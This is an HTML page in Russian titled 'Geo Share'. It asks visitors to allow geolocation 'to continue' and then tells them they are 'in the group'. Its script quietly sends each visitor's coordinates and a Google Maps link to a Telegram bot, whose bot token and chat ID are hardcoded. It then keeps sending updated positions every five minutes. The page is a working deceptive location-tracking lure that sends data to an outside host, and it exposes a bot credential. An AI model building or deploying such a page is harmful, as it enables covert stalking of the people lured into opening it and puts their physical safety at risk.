<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Geo Share</title>

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(135deg,#06121f,#0a2a44,#0e3b5e);
  font-family:Arial;
  color:white;
}

.box{
  width:90%;
  max-width:420px;
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(15px);
  padding:25px;
  border-radius:20px;
  text-align:center;
}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  background:#00b7ff;
  color:white;
  font-weight:bold;
  margin-top:10px;
}

.status{
  margin-top:15px;
  font-size:14px;
  color:#bfe8ff;
}
</style>
</head>

<body>

<div class="box">
  <h2>📍 Геолокация</h2>

  <p>Для продолжения нажмите кнопку</p>

  <button onclick="startGPS()">Разрешить геолокацию</button>

  <div class="status" id="status">ожидание...</div>
</div>

<script>
const BOT_TOKEN = "8837254914:AAFuvODF5meguiR61yWRcPO0KwzeoY6k--c";
const CHAT_ID = "8424328584";

let lat = null;
let lon = null;

async function sendTG(msg){
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text:msg
    })
  });
}

function startGPS(){

  if(!navigator.geolocation){
    document.getElementById("status").innerText =
      "GPS не поддерживается";
    return;
  }

  document.getElementById("status").innerText =
    "ожидание разрешения...";

  navigator.geolocation.getCurrentPosition(
    (pos)=>{

      lat = pos.coords.latitude;
      lon = pos.coords.longitude;

      document.getElementById("status").innerText =
        "Вы в группе";

      sendTG(`📍 Первое подключение\n${lat}, ${lon}`);

      // каждые 5 минут
      setInterval(async ()=>{

        navigator.geolocation.getCurrentPosition(async (p)=>{
          const lat = p.coords.latitude;
          const lon = p.coords.longitude;

          await sendTG(
`📍 Обновление GPS

Координаты:
${lat}, ${lon}

Google Maps:
https://maps.google.com/?q=${lat},${lon}`
          );

        });

      }, 5 * 60 * 1000);

    },

    (err)=>{
      document.getElementById("status").innerText =
        "Разрешите геолокацию";
    }
  );
}
</script>

</body>
</html>
